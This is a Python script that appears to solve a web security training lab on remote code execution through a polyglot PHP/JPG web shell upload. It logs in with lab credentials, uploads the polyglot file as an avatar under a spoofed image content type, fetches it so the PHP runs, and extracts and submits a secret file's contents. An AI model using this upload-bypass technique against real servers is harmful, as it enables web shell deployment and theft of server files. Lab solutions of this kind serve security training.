"""
    Lab: Remote code execution via polyglot web shell upload

    This lab contains a vulnerable image upload function. The server attempts to block dangerous file types, but this restriction can be bypassed using a polyglot file.
    To solve the lab, create a polyglot PHP/JPG file that contains a PHP payload in its metadata. Use this file to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
    You can log in to your own account using the following credentials: wiener:peter

    Exploit Steps:
    1. Create a polyglot PHP/JPG file with the PHP payload in its metadata.
    2. Log in to the application using the provided credentials.
    3. Upload the polyglot file as your avatar.
    4. Use the uploaded file to read the contents of the file /home/carlos/secret.
    5. Submit the contents of the secret file using the button provided in the lab banner.

    Author: N00BCYB0T
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--file', required=True, help='Path to the polyglot PHP/JPG file')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    print(f"{Fore.YELLOW}[*] Getting CSRF token and logging in...{Fore.RESET}")
    csrf_token = get_csrf(session, "/login")
    login_data = {
        "username": "wiener",
        "password": "peter",
        "csrf": csrf_token
    }
    r = session.post(f"{URL}/login", data=login_data, allow_redirects=True)
    if "Your username is: wiener" not in r.text:
        print(f"{Fore.RED}[-] Login failed{Fore.RESET}")
        return
    print(f"{Fore.GREEN}[+] Logged in as wiener{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Uploading polyglot PHP/JPG file...{Fore.RESET}")
    csrf_token = get_csrf(session, "/my-account")
    with open(args.file, "rb") as f:
        file_content = f.read()
    filename = args.file.split("\\")[-1].split("/")[-1]
    files = {
        "avatar": (filename, file_content, "image/jpeg")
    }
    data = {
        "csrf": csrf_token,
        "user": "wiener"
    }
    r = session.post(f"{URL}/my-account/avatar", files=files, data=data, allow_redirects=True)
    if r.status_code != 200:
        print(f"{Fore.RED}[-] Polyglot file upload failed{Fore.RESET}")
        return
    print(f"{Fore.GREEN}[+] Uploaded polyglot file{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Accessing uploaded polyglot file...{Fore.RESET}")
    r = session.get(f"{URL}/files/avatars/{filename}")
    secret_match = re.search(r'START (.+?) END', r.text, re.DOTALL)
    if not secret_match:
        print(f"{Fore.RED}[-] Failed to extract secret from polyglot file{Fore.RESET}")
        return
    secret = secret_match.group(1).strip()
    print(f"{Fore.GREEN}[+] Got secret: {secret}{Fore.RESET}")

    print(f"{Fore.YELLOW}[*] Submitting solution...{Fore.RESET}")
    session.post(f"{URL}/submitSolution", data={"answer": secret, "csrf": csrf_token})
    solved = session.get(f"{URL}/")
    if "Congratulations, you solved the lab!" in solved.text:
        print(f"{Fore.GREEN}[+] Lab solved!{Fore.RESET}")
    else:
        print(f"{Fore.RED}[-] Failed to solve the lab{Fore.RESET}")

def get_csrf(session, page):
    r = session.get(f"{URL}{page}")
    m = re.search(r'csrf" value="(.+?)"', r.text)
    if not m:
        print(f"{Fore.RED}[-] CSRF token not found on {page}{Fore.RESET}")
        exit(1)
    return m.group(1)

if __name__ == "__main__":
    main()